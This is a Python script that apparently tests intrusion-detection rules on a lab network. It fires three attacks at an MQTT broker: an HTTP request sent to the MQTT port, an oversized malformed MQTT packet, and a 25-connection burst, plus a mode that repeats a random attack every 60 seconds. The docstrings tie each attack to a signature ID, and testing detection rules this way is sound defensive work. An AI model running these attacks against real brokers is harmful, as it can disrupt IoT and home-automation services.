import random
import socket
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# Target Configuration
MQTT_BROKER = "10.0.40.10"
MQTT_PORT = 1883
HOME_ASSISTANT_IP = "192.168.1.57"
HOME_ASSISTANT_PORT = 8123


def trigger_protocol_mismatch():
    """Attack 1: Sends raw HTTP GET request to MQTT Port 1883 over a real TCP stream.
    Triggers SID: 1000002
    """
    print(f"\n[*] [Attack 1] Triggering HTTP Protocol Mismatch on {MQTT_BROKER}:{MQTT_PORT}...")
    payload = b"GET / HTTP/1.1\r\nHost: 10.0.40.10\r\n\r\n"

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((MQTT_BROKER, MQTT_PORT))
        s.sendall(payload)
        print("[+] HTTP payload delivered over established TCP session.")
        time.sleep(0.5)
        s.close()
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False


def trigger_malformed_payload():
    """Attack 2: Sends malformed MQTT payload with oversized buffer.
    Triggers SID: 1000003
    """
    print(f"\n[*] [Attack 2] Triggering malformed payload attack on {MQTT_BROKER}:{MQTT_PORT}...")
    malformed_payload = b"\x30\x00\x00\x00" + (b"A" * 1200)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((MQTT_BROKER, MQTT_PORT))
        s.sendall(malformed_payload)
        print("[+] Attack payload sent over established TCP session.")
        s.close()
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False


def send_burst_syn(_):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((MQTT_BROKER, MQTT_PORT))
        s.close()
        return True
    except Exception:
        return False


def trigger_connection_burst():
    """Attack 3: Rapidly opens 25 parallel TCP connections in <0.1s.
    Triggers SID: 1000010 / 1000004
    """
    burst_count = 25
    print(f"\n[*] [Attack 3] Triggering parallel connection burst on {MQTT_BROKER}:{MQTT_PORT} ({burst_count} conns)...")

    start_time = time.time()
    with ThreadPoolExecutor(max_workers=25) as executor:
        results = list(executor.map(send_burst_syn, range(burst_count)))

    duration = round(time.time() - start_time, 3)
    success_count = sum(1 for r in results if r)
    print(f"[+] Finished {success_count}/{burst_count} connections in {duration}s.")
    return success_count > 0


def print_attack_report(attack_log):
    """Prints a structured summary table of all recorded automated attacks."""
    print("\n" + "=" * 70)
    print(f"{'AUTOMATED ATTACK SESSION REPORT':^70}")
    print("=" * 70)
    print(f"{'#':<4} | {'Timestamp':<20} | {'Attack Name':<30} | {'Status':<8}")
    print("-" * 70)

    if not attack_log:
        print("No attacks were executed during this session.")
    else:
        for idx, entry in enumerate(attack_log, 1):
            print(
                f"{idx:<4} | {entry['timestamp']:<20} | {entry['name']:<30} | {entry['status']:<8}"
            )

    print("=" * 70)
    print(f"Total attacks executed: {len(attack_log)}\n")


def run_automated_random_mode():
    """Option 5: Executes a random attack every 60 seconds until stopped by user."""
    attack_pool = [
        ("HTTP Protocol Mismatch", trigger_protocol_mismatch),
        ("Malformed Payload (Buffer)", trigger_malformed_payload),
        ("Connection Burst Flood", trigger_connection_burst),
    ]

    attack_log = []
    stop_event = threading.Event()

    def attack_worker():
        while not stop_event.is_set():
            name, attack_func = random.choice(attack_pool)
            timestamp_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            print(f"\n[>>>] Launching random attack: {name} at {timestamp_str}")
            success = attack_func()

            attack_log.append(
                {
                    "timestamp": timestamp_str,
                    "name": name,
                    "status": "Success" if success else "Failed",
                }
            )

            # Wait 60 seconds or break immediately if user signals stop
            if stop_event.wait(timeout=60):
                break

    worker_thread = threading.Thread(target=attack_worker, daemon=True)
    worker_thread.start()

    print("\n" + "#" * 60)
    print("[*] Automated Attack Mode running (every 60s).")
    print("[*] Type 'q' and press [Enter] at any time to stop and view report.")
    print("#" * 60 + "\n")

    while True:
        user_input = input().strip().lower()
        if user_input == "q":
            print("\n[*] Stopping automated attack loop...")
            stop_event.set()
            worker_thread.join()
            break

    print_attack_report(attack_log)


def main():
    while True:
        print("\nSelect an attack mode:")
        print("1. Protocol Mismatch Attack (HTTP on MQTT)")
        print("2. Malformed Payload Attack")
        print("3. Connection Burst Attack")
        print("4. Automated Random Mode (Every 60s with report on 'q')")
        print("5. Exit")

        choice = input("Enter choice (1-5): ").strip()

        if choice == "1":
            trigger_protocol_mismatch()
        elif choice == "2":
            trigger_malformed_payload()
        elif choice == "3":
            trigger_connection_burst()
        elif choice == "4":
            run_automated_random_mode()
        elif choice == "5":
            print("[*] Exiting script.")
            sys.exit(0)
        else:
            print("[!] Invalid choice. Select 1-5.")

        time.sleep(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Script terminated by user.")
        sys.exit(0)